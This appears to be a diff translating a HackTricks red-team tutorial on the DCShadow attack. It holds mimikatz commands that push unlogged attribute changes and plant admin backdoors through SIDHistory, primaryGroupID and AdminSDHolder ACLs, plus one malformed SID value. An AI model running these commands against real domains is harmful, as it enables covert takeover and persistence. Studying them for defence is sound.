@@ -1,14 +1,14 @@
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
@@ -16,10 +16,10 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 # DCShadow
 
-Dit registreer 'n **nuwe Domeinbeheerder** in die AD en gebruik dit om **atribute** (SIDHistory, SPNs...) op gespesifiseerde voorwerpe **te druk** **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **het DA** regte nodig en moet binne die **worteldomein** wees.\
-Let daarop dat as jy verkeerde data gebruik, sal daar baie lelike logs verskyn.
+它在 AD 中注册一个 **新的域控制器**，并使用它在指定对象上 **推送属性**（SIDHistory, SPNs...），**不**留下任何关于 **修改** 的 **日志**。你 **需要 DA** 权限并且在 **根域** 内。\
+请注意，如果使用错误的数据，会出现相当难看的日志。
 
-Om die aanval uit te voer, het jy 2 mimikatz instansies nodig. Een van hulle sal die RPC bedieners met SYSTEM regte begin (jy moet hier die veranderinge aandui wat jy wil maak), en die ander instansie sal gebruik word om die waardes te druk:
+要执行攻击，你需要 2 个 mimikatz 实例。其中一个将以 SYSTEM 权限启动 RPC 服务器（你必须在这里指明你想要执行的更改），另一个实例将用于推送值：
 
 {% code title="mimikatz1 (RPC servers)" %}
 ```bash
@@ -29,46 +29,46 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```
 {% endcode %}
 
-{% code title="mimikatz2 (push) - Vereis DA of soortgelyk" %}
+{% code title="mimikatz2 (push) - 需要 DA 或类似权限" %}
 ```bash
 lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Let op dat **`elevate::token`** nie in `mimikatz1` sessie sal werk nie, aangesien dit die voorregte van die draad verhoog het, maar ons moet die **voorreg van die proses** verhoog.\
-Jy kan ook 'n "LDAP" objek kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+注意 **`elevate::token`** 在 `mimikatz1` 会话中无法工作，因为这提升了线程的权限，但我们需要提升 **进程的权限**。\
+您还可以选择并“LDAP”对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Jy kan die veranderinge vanaf 'n DA of vanaf 'n gebruiker met hierdie minimale toestemmings druk:
+您可以从 DA 或具有以下最小权限的用户推送更改：
 
-* In die **domein objek**:
-* _DS-Install-Replica_ (Voeg/Verwyder Replica in Domein)
-* _DS-Replication-Manage-Topology_ (Bestuur Replika Topologie)
-* _DS-Replication-Synchronize_ (Replika Sinchronisasie)
-* Die **Sites objek** (en sy kinders) in die **Konfigurasie houer**:
-* _CreateChild en DeleteChild_
-* Die objek van die **rekenaar wat geregistreer is as 'n DC**:
-* _WriteProperty_ (Nie Skryf nie)
-* Die **teiken objek**:
-* _WriteProperty_ (Nie Skryf nie)
+* 在 **域对象**中：
+* _DS-Install-Replica_（在域中添加/删除副本）
+* _DS-Replication-Manage-Topology_（管理复制拓扑）
+* _DS-Replication-Synchronize_（复制同步）
+* **配置容器**中的 **站点对象**（及其子对象）：
+* _CreateChild 和 DeleteChild_
+* 作为 DC 注册的 **计算机对象**：
+* _WriteProperty_（不是 Write）
+* **目标对象**：
+* _WriteProperty_（不是 Write）
 
-Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan 'n onvoorregte gebruiker te gee (let op dat dit 'n paar logs sal agterlaat). Dit is baie meer beperkend as om DA voorregte te hê.\
-Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Dit beteken dat die gebruikersnaam _**student1**_ wanneer hy aan die masjien _**mcorp-student1**_ ingelog is, DCShadow toestemmings oor die objek _**root1user**_ het.
+您可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限授予无特权用户（注意这会留下某些日志）。这比拥有 DA 权限要严格得多。\
+例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着用户名 _**student1**_ 在机器 _**mcorp-student1**_ 上登录时对对象 _**root1user**_ 拥有 DCShadow 权限。
 
-## Gebruik DCShadow om agterdeure te skep
+## 使用 DCShadow 创建后门
 
-{% code title="Stel Enterprise Admins in SIDHistory na 'n gebruiker" %}
+{% code title="将 SIDHistory 中的企业管理员设置为用户" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
 {% endcode %}
 
-{% code title="Verander PrimaryGroupID (sit gebruiker as lid van Domein Administrators)" %}
+{% code title="更改 PrimaryGroupID (将用户作为域管理员的成员)" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
 {% endcode %}
 
-{% code title="Wysig ntSecurityDescriptor van AdminSDHolder (gee Volle Beheer aan 'n gebruiker)" %}
+{% code title="修改 AdminSDHolder 的 ntSecurityDescriptor（给予用户完全控制权限）" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
@@ -77,35 +77,38 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Gee DCShadow toestemmings met behulp van DCShadow (geen gewysigde toestemmingslogs)
+## Shadowception - 使用 DCShadow 授予 DCShadow 权限（无修改权限日志）
 
-Ons moet die volgende ACE's met ons gebruiker se SID aan die einde byvoeg:
+我们需要在用户的 SID 末尾附加以下 ACE：
 
-* Op die domein objek:
+* 在域对象上：
 * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
 * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
 * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-* Op die aanvaller rekenaar objek: `(A;;WP;;;UserSID)`
-* Op die teiken gebruiker objek: `(A;;WP;;;UserSID)`
-* Op die Sites objek in Konfigurasie houer: `(A;CI;CCDC;;;UserSID)`
+* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
+* 在目标用户对象上：`(A;;WP;;;UserSID)`
+* 在配置容器中的站点对象上：`(A;CI;CCDC;;;UserSID)`
 
-Om die huidige ACE van 'n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+要获取对象的当前 ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. So, in die **mimikatz1 sessie** (RPC bediener) gebruik die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier, sal jy net een keer **`/push`** hoef te doen om al die gestopte veranderinge in die rogue bediener uit te voer.
+请注意，在这种情况下，您需要进行**多个更改，**而不仅仅是一个。因此，在**mimikatz1 会话**（RPC 服务器）中，使用参数 **`/stack` 进行每个更改**。这样，您只需**`/push`** 一次即可在流氓服务器上执行所有堆积的更改。
 
-[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+
+
+[**有关 DCShadow 的更多信息，请访问 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
